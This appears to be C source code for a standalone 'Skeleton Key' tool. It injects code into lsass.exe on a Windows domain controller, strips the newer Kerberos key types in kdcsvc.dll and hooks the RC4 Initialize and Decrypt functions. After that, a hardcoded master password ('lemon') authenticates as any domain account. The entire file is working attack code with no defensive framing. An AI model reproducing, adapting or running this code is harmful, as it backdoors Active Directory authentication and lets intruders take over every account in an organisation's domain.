#include "SkeletonKey.h"


wchar_t newerKey[] = L"Kerberos-Newer-Keys";
wchar_t kdcsvc[] = L"kdcsvc.dll", cryptdll[] = L"cryptdll.dll";

typedef NTSTATUS(WINAPI* PCDLOCATECSYSTEM)(ULONG Type, PKERB_ECRYPT* ppCSystem);
typedef PVOID(__cdecl* PMEMCPY) (__out_bcount_full_opt(_MaxCount) void* _Dst, __in_bcount_opt(_MaxCount) const void* _Src, __in size_t _MaxCount); // 0x4141414141414141
typedef HLOCAL(WINAPI* PLOCALALLOC) (__in UINT uFlags, __in SIZE_T uBytes); // 0x4242424242424242
typedef HLOCAL(WINAPI* PLOCALFREE) (__deref HLOCAL hMem); // 0x4343434343434343

#pragma optimize("", off)
NTSTATUS WINAPI Skel_rc4_init(LPCVOID Key, DWORD KeySize, DWORD KeyUsage, PVOID* pContext)
{
	NTSTATUS status = STATUS_INSUFFICIENT_RESOURCES;
	PVOID pOrigContext = 0, pCustomContext = 0;
	DWORD SkeletonKey[] = { 0x2487308a, 0x6cee17c0, 0x2af4cfe8, 0x329cb78e }; // NT Hash "lemon" : 8a308724c017ee6ce8cff42a8eb79c32

	*pContext = ((PLOCALALLOC)0x4242424242424242)(0, 32 + sizeof(PVOID));
	if (*pContext)
	{
		status = ((PKERB_ECRYPT_INITIALIZE)0x4a4a4a4a4a4a4a4a)(Key, KeySize, KeyUsage, &pOrigContext);
		if (NT_SUCCESS(status))
		{
			((PMEMCPY)0x4141414141414141)((PBYTE)*pContext + 0, pOrigContext, 16);
			status = (((PKERB_ECRYPT_INITIALIZE)0x4a4a4a4a4a4a4a4a)(SkeletonKey, 16, KeyUsage, &pCustomContext));
			if (NT_SUCCESS(status))
			{
				((PMEMCPY)0x4141414141414141)((PBYTE)*pContext + 16, pCustomContext, 16);
				((PLOCALFREE)0x4343434343434343)(pCustomContext);
			}
			*(LPCVOID*)((PBYTE)*pContext + 32) = Key;
			((PLOCALFREE)0x4343434343434343)(pOrigContext);
		}
		if (!NT_SUCCESS(status))
		{
			((PLOCALFREE)0x4343434343434343)(*pContext);
			*pContext = NULL;
		}
	}

	return status;

}
NTSTATUS WINAPI Skel_rc4_init_decrypt(PVOID pContext, LPCVOID Data, DWORD DataSize, PVOID Output, DWORD* OutputSize)
{
	NTSTATUS status = STATUS_INSUFFICIENT_RESOURCES;
	DWORD origOutSize = *OutputSize, SkeletonKey[] = { 0x2487308a, 0x6cee17c0, 0x2af4cfe8, 0x329cb78e }; // NT Hash "lemon" : 8a308724c017ee6ce8cff42a8eb79c32
	PVOID buffer = 0;

	buffer = ((PLOCALALLOC)0x4242424242424242)(0, DataSize);
	if (buffer)
	{
		((PMEMCPY)0x4141414141414141)(buffer, Data, DataSize);
		status = ((PKERB_ECRYPT_DECRYPT)0x4b4b4b4b4b4b4b4b)(pContext, buffer, DataSize, Output, OutputSize);
		if (!NT_SUCCESS(status))
		{
			*OutputSize = origOutSize;
			status = ((PKERB_ECRYPT_DECRYPT)0x4b4b4b4b4b4b4b4b)((PVOID)((PBYTE)pContext + 16), buffer, DataSize, Output, OutputSize);
			if (NT_SUCCESS(status))
			{
				((PMEMCPY)0x4141414141414141)(*(PVOID*)((PBYTE)pContext + 32), SkeletonKey, 16);
			}
		}
		((PLOCALFREE)0x4343434343434343)(buffer);
	}

	return status;

}
DWORD Skel_rc4_end()
{
	return 0;
}
#pragma optimize("", on)


int wmain()
{
	PCDLOCATECSYSTEM CDLocateCSystem = 0;
	PKERB_ECRYPT pCrypt = 0;
	SK_MODULE_INFORMATION pCryptInfo = { 0 };
	PLSA_UNICODE_STRING lsaPatternRemoteStruct = 0;
	LSA_UNICODE_STRING lsaPatternLocalStruct = { 0 };
	HANDLE hProcess = 0;
	HMODULE LocalCryptdllBase = 0;
	LPVOID pattern_data = 0, pattern_struct = 0;
	DWORD processID = Skel_ValidateLsassPid();
	BOOL keysPatched = FALSE;
	LPVOID Buffer = 0, RemoteFunctions = 0, pInitialize = 0, pDecrypt = 0;
	SIZE_T szFunc = (SIZE_T)((PBYTE)Skel_rc4_end - (PBYTE)Skel_rc4_init);
	SK_FUNCTION_PTR RemotePtrs[] = {
		{L"ntdll.dll", "memcpy", (PVOID)0x4141414141414141, NULL},
		{L"kernel32.dll", "LocalAlloc", (PVOID)0x4242424242424242, NULL},
		{L"kernel32.dll", "LocalFree", (PVOID)0x4343434343434343, NULL},
		{NULL, NULL, (PVOID)0x4a4a4a4a4a4a4a4a, NULL}, // init
		{NULL, NULL, (PVOID)0x4b4b4b4b4b4b4b4b, NULL} // decrypt
	};


	if (EnableDebugPrivilege() == TRUE)
	{
		PRINT_SUCCESS(L"Debug privilege ok\n");
		if (processID != 0)
		{
			hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, processID);
			if (hProcess != NULL)
			{
				if (Skel_GetRemoteModuleInformation(processID, (LPWSTR)kdcsvc, &pCryptInfo) == TRUE)
				{
					PRINT_SUCCESS(L"Module found : %s ( 0x%-016p )\n", kdcsvc, pCryptInfo.dllBase);
					pattern_data = Skel_SearchRemotePattern(hProcess, &pCryptInfo, (LPCVOID)newerKey, wcslen(newerKey));
					if (pattern_data != 0)
					{
						PRINT_SUCCESS(L"First pattern found : 0x%-016p\n", pattern_data);
						pattern_struct = Skel_SearchRemotePattern(hProcess, &pCryptInfo, (LPCVOID)&pattern_data, sizeof(LPCVOID));
						if (pattern_struct != 0)
						{
							PRINT_SUCCESS(L"Second pattern found : 0x%-016p\n", pattern_struct);
							lsaPatternRemoteStruct = (PLSA_UNICODE_STRING)((DWORD_PTR)pattern_struct - FIELD_OFFSET(LSA_UNICODE_STRING, Buffer));
							keysPatched = WriteProcessMemory(hProcess, lsaPatternRemoteStruct, (LPCVOID)&lsaPatternLocalStruct, sizeof(LSA_UNICODE_STRING), NULL);
							SecureZeroMemory(&pCryptInfo, sizeof(SK_MODULE_INFORMATION));
						}
						else
							PRINT_ERROR(L"Second pattern not found. System already patched (?). Aborting...\n");
					}
					else
						PRINT_ERROR(L"First pattern not found. Aborting...\n");
				}
				else
					PRINT_ERROR(L"%s not found (0x%ld). Aborting...\n", kdcsvc, GetLastError());

				if (keysPatched)
				{
					PRINT_SUCCESS(L"Keys patch ok\n");
					if (Skel_GetRemoteModuleInformation(processID, (LPWSTR)cryptdll, &pCryptInfo) == TRUE)
					{
						LocalCryptdllBase = GetModuleHandle(cryptdll);
						if (LocalCryptdllBase == NULL)
						{
							LocalCryptdllBase = LoadLibrary(cryptdll);
						}
						if (LocalCryptdllBase != NULL)
						{
							CDLocateCSystem = (PCDLOCATECSYSTEM)GetProcAddress(LocalCryptdllBase, "CDLocateCSystem");
							if (CDLocateCSystem != NULL)
							{
								if (NT_SUCCESS(CDLocateCSystem(KERB_ETYPE_RC4_HMAC_NT, &pCrypt)))
								{
									PRINT_SUCCESS(L"KERB_ETYPE_RC4_HMAC_NT located: 0x%-016p\n", pCrypt);
									Buffer = (LPVOID)LocalAlloc(LPTR, szFunc);
									if (Buffer != NULL)
									{
										RtlCopyMemory(Buffer, Skel_rc4_init, szFunc);
										RemotePtrs[3].Ptr = pCrypt->Initialize;
										RemotePtrs[4].Ptr = pCrypt->Decrypt;
										RemoteFunctions = Skel_ResolveFakeFunctionPointers(hProcess, Buffer, (DWORD)szFunc, (PSK_FUNCTION_PTR)&RemotePtrs, (DWORD)(sizeof(RemotePtrs) / sizeof(SK_FUNCTION_PTR)));
										if (RemoteFunctions != NULL)
										{
											PRINT_SUCCESS(L"Handlers up and ready\n");
											pInitialize = RemoteFunctions;
											pDecrypt = (LPVOID)((DWORD_PTR)RemoteFunctions + (DWORD)((DWORD_PTR)Skel_rc4_init_decrypt - (DWORD_PTR)Skel_rc4_init));
											if (
												(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Initialize)), (LPCVOID)&pInitialize, sizeof(PVOID), NULL)) &&
												(WriteProcessMemory(hProcess, (LPVOID)((DWORD_PTR)pCrypt + FIELD_OFFSET(KERB_ECRYPT, Decrypt)), (LPCVOID)&pDecrypt, sizeof(PVOID), NULL))
												)
											{
												PRINT_SUCCESS(L"Connectors ok\n");
											}
											else
											{
												PRINT_ERROR(L"Patching error. Freeing memory...\n");
												VirtualFreeEx(hProcess, RemoteFunctions, 0, MEM_RELEASE);
											}
										}
										else
											PRINT_ERROR(L"Remote function error.\n");
									}
									else
										PRINT_ERROR(L"Heap allocation error.\n");
								}
								else
									PRINT_ERROR(L"CDLocateCSystem error.\n");
							}
							else
								PRINT_ERROR(L"CDLocateCSystem ptr error.\n");
						}
						else
							PRINT_ERROR(L"%s loading failure. Aborting...\n", cryptdll);
					}
					else
						PRINT_ERROR(L"%s not found (0x%ld). Aborting...\n", kdcsvc, GetLastError());
				}

				CloseHandle(hProcess);
			}
			else
				PRINT_ERROR(L"Could not open process %d (0x%ld). Aborting...\n", processID, GetLastError());
		}
		else
			PRINT_ERROR(L"lsass.exe not found (?). Aborting...\n");
	}
	else
		PRINT_ERROR(L"Insufficient privileges (0x%ld). Aborting...\n", GetLastError());

	return 0;

}